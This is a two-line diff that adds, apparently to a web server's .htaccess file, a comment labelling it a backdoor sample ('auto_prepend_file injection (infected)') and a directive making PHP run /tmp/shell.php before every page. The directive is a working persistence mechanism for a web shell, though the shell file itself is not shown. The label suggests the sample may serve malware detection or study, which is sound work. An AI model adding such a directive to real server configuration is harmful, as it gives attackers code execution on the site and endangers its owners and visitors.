@@ -1,0 +1,2 @@
+# lw:0014 backdoor - auto_prepend_file injection (infected)
+php_value auto_prepend_file /tmp/shell.php
